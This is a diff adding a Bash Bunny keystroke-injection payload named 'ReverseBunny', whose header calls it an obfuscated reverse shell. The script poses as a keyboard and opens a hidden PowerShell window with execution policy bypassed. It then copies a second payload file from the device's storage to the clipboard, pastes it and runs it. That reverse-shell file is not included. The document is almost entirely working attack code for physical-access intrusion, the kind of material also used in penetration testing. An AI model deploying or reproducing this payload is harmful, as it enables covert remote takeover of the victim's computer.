@@ -1,0 +1,30 @@
+# Title:         ReverseBunny
+# Description:   Obfuscated reverse shell, executed via powershell
+# Author:        0iphor13
+# Version:       1.0
+# Category:      Execution
+# Attackmodes:   HID, Storage
+
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+DUCKY_LANG de
+
+#LED RED - DON'T EJECT - PAYLOAD RUNNING
+
+LED R FAST
+
+DELAY 5000
+RUN WIN "powershell -NoP -W hidden -NonI -Exec Bypass"
+DELAY 2000
+
+Q STRING "Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\ReverseBunny.txt'))"
+DELAY 5000
+Q ENTER
+DELAY 5000
+Q CONTROL v
+DELAY 5000
+Q ENTER
+
+LED FINISH
+
+#SAVE TO EJECT
